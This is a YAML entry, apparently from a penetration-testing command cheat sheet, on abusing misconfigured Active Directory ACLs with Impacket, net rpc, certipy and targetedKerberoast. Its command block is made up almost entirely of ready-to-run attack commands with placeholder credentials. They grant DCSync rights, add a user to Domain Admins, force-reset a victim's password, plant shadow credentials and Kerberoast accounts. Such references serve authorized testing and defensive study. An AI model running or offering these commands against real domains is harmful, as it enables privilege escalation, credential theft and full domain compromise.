---
description: |
  Exploit misconfigured AD ACLs using Impacket tools. Add users
  to groups, reset passwords, or grant DCSync rights.

  Reference values:
    Target DC: 10.10.10.1
    Domain: test.local
    Username: pentuser
    Password: P@ssw0rd123
command: |
  # Grant DCSync rights (WriteDACL on domain)
  impacket-dacledit -action write -rights DCSync -principal pentuser -target-dn "DC=test,DC=local" test.local/pentuser:P@ssw0rd123

  # Add user to group (GenericAll/GenericWrite on group)
  net rpc group addmem "Domain Admins" pentuser -U test.local/pentuser%P@ssw0rd123 -S 10.10.10.1

  # Force change password (ForceChangePassword)
  net rpc password victim -U test.local/pentuser%P@ssw0rd123 -S 10.10.10.1

  # Shadow Credentials (GenericAll/GenericWrite on user)
  certipy shadow auto -u pentuser@test.local -p 'P@ssw0rd123' -account victim

  # Targeted Kerberoasting (GenericAll/GenericWrite — set SPN)
  python3 targetedKerberoast.py -u pentuser -p P@ssw0rd123 -d test.local --dc-ip 10.10.10.1
phase:
  - Exploitation
  - Post-Exploitation
target_os:
  - Windows
services:
  - LDAP
items:
  - Username
  - Password
techniques:
  - ACL_Abuse
  - Shadow_Credentials
  - DCSync
network_position:
  - Internal
references:
  - https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/acl-persistence-abuse/index.html
---
